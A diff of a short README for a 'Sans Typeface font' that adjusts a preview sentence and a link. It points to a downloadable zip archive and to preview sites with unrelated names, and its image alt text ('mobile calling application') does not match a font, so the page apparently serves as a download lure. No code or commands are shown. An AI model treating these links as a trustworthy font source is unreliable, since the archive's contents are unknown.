@@ -1,7 +1,7 @@
 # Sans Typeface font
 <b>Welcome</b> <br>
 
-A casual modern <a href="https://github.com/qp5/FONT/raw/main/FONT.zip">Sans font <small>🡇</small></a> typeset.   Prieview here: <a target="_blank" href="https://VissorGlasses.com">VissorGlasses.com</a> | <a target="_blank" href="https://bowHip.org/foster">bowHip.org</a><br>
+A casual modern <a href="https://github.com/qp5/FONT/raw/main/FONT.zip">Sans font <small>🡇</small></a> typeset. Prieview here coming soon: <a target="_blank" href="https://VissorGlasses.com">VissorGlasses.com</a> | <a target="_blank" href="https://bowHip.org">bowHip.org</a><br>
 
 <a href="https://github.com/qp5/FONT/raw/main/FONT.zip"><img style="height: 280px; margin-bottom:-0px; margin-top:0px;" src="https://bowhip.org/img/font_thumb_publisher_card.png" alt="mobile calling application"></a> 
 
